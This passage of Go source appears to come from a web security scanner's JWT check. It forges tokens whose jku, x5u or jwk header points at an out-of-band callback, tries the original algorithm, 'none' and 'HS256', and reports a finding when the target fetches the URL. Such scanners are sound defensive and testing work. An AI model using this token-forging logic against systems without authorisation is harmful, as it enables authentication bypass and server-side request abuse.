			var document bytes.Buffer
			document.WriteString("-----BEGIN PUBLIC KEY-----\n")
			document.WriteString(base64.StdEncoding.EncodeToString(derived))
			document.WriteString("\n-----END PUBLIC KEY-----\n")
			out = append(out, document.Bytes())
			// A verifier that was handed the DER rather than the PEM would use this.
			out = append(out, derived)
		}
	}
	return out
}

// jwtKeyFields are the JWT header fields that name where the verification key lives.
var jwtKeyFields = []string{"jku", "x5u", "jwk"}

// jwtKeyURL reports a verifier that followed a key address the token itself supplied.
//
// The field is the strongest thing a token header can ask for, because nothing the verifier
// already trusts has signed it: point it at a host the caller controls and the verifier
// fetches a document of the caller's choosing and, in the ordinary implementation, verifies
// with the key it finds there. The callback is the proof, and it is a better one than a
// forged token would be: it holds even when the token is then rejected, and it needs no
// guess about the verifier's key handling.
//
// Three spellings of the algorithm are sent, because a verifier that checks the signature
// before it looks at the header would otherwise never reach the fetch.
func jwtKeyURL(ctx context.Context, c *checks.Context, t *checks.Target, field, original string, parts []string, header map[string]any) *finding.Finding {
	if c.OOB == nil {
		return nil
	}
	wait := c.OOBWait
	if wait <= 0 {
		wait = checks.OOBWait
	}

	var (
		tokens   []string
		requests []*httpmsg.Request
		// keyField is kept outside the loop: the finding names the field that worked, and
		// by then the loop variable is out of scope.
		keyField string
	)
	for _, keyField = range jwtKeyFields {
		callbackURL, token := c.OOB.NewURL("jwt")
		tokens = append(tokens, token)

		for _, spelling := range []struct {
			algorithm any
			signature string
		}{
			{header["alg"], parts[2]},
			{"none", ""},
			{"HS256", ""},
		} {
			forgedHeader := map[string]any{}
			for k, v := range header {
				forgedHeader[k] = v
			}
			forgedHeader[keyField] = callbackURL
			forgedHeader["alg"] = spelling.algorithm

			forged := encodeJWTPart(forgedHeader) + "." + parts[1] + "." + spelling.signature
			mutated := t.Request.Clone()
			mutated.Header.Set(field, replaceToken(t.Request.Header.Get(field), original, forged))
			requests = append(requests, mutated)
			if _, err := c.Do(ctx, mutated); err != nil {
				continue
			}
		}
	}

	deadline := time.Now().Add(wait)
	for {
		for _, token := range tokens {
			interactions := c.OOB.Poll(token)
			if len(interactions) == 0 {
				continue
			}
			f := checks.NewFinding(jwt{}, t,
				i18n.KeyCheckJWTKeyURLTitle, i18n.KeyCheckJWTKeyURLDesc, i18n.KeyCheckJWTFix)
			f.Severity = finding.SeverityHigh
			f.Confidence = finding.ConfidenceCertain
			f.Method = "GET"
			f.URL = t.Request.URLString()
			f.Payload = "jwt header key address (" + strings.Join(jwtKeyFields, "/") +
				") pointing at the scanner's callback"
			f.CWE = "CWE-347"
			f.References = []string{
				"https://portswigger.net/web-security/jwt",
				"https://cwe.mitre.org/data/definitions/347.html",
			}
			f.Evidence.Request = requests[0].Raw()
			f.Evidence.Response = []byte(c.Bundle.T(i18n.KeyEvidenceOOB,
				"the header's key address", interactions[0].Detail, interactions[0].RemoteAddr))
			f.Evidence.Matches = []string{
				"the verifier fetched a key address the token itself named (" +
					strings.Join(jwtKeyFields, "/") + "; " + keyField + " was the one seen first)",
				"a key address in the token is chosen by whoever minted it, so a verifier that " +
					"follows it can be made to fetch anything and to trust what it finds",
			}
			return f
		}
		if time.Now().After(deadline) {
			return nil
		}
		select {
		case <-time.After(250 * time.Millisecond):
		case <-ctx.Done():
			return nil
		}
	}
}

// findJWT returns the field a token was found in and the token itself.
func findJWT(req *httpmsg.Request) (field, token string) {
	for _, name := range jwtLocations {
		value := req.Header.Get(name)
		if value == "" {
			continue
		}
		if found := extractJWT(value); found != "" {
			return name, found
		}
	}
	return "", ""
}

// extractJWT pulls a JWT out of a header value, which may hold more than one
// credential (a Cookie header, for instance).
func extractJWT(value string) string {
	for _, part := range strings.FieldsFunc(value, func(r rune) bool {
		return r == ' ' || r == ';' || r == ',' || r == '='
	}) {
		part = strings.Trim(part, `"'`)
		if strings.Count(part, ".") != 2 {
			continue
		}
		// A JWT always starts with a base64url-encoded object: `{"` is `ey`.
		if !strings.HasPrefix(part, "ey") {
			continue
		}
		return part
	}
	return ""
}

// decodeJWTPart decodes a base64url segment into a generic object.
func decodeJWTPart(part string) (map[string]any, error) {
	raw, err := base64.RawURLEncoding.DecodeString(strings.TrimRight(part, "="))
	if err != nil {
		return nil, err
	}
	out := map[string]any{}
	if err := json.Unmarshal(raw, &out); err != nil {
		return nil, err
	}
	return out, nil
}

// encodeJWTPart encodes an object into a base64url segment.
func encodeJWTPart(value map[string]any) string {
	raw, err := json.Marshal(value)
	if err != nil {
		return ""
	}
	return base64.RawURLEncoding.EncodeToString(raw)
}
